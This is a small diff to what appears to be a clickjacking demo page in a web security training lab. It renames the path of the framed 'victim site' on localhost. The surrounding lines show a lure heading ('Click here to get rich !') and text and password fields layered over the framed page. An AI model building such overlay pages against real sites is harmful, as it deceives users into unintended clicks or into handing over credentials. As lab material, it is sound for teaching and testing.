@@ -30,7 +30,7 @@ button {
 </style>
 
 <!-- The url from the victim site -->
-<iframe src="http://127.0.0.1/WebAppPentest/11-ClickJacking/secure.php"> </iframe>
+<iframe src="http://127.0.0.1/BrokenApp/11-ClickJacking/secure.php"> </iframe>
 <h1> Click here to get rich ! </h1>
 <input type="text" name="test1">
 <input type="password" name="test2">
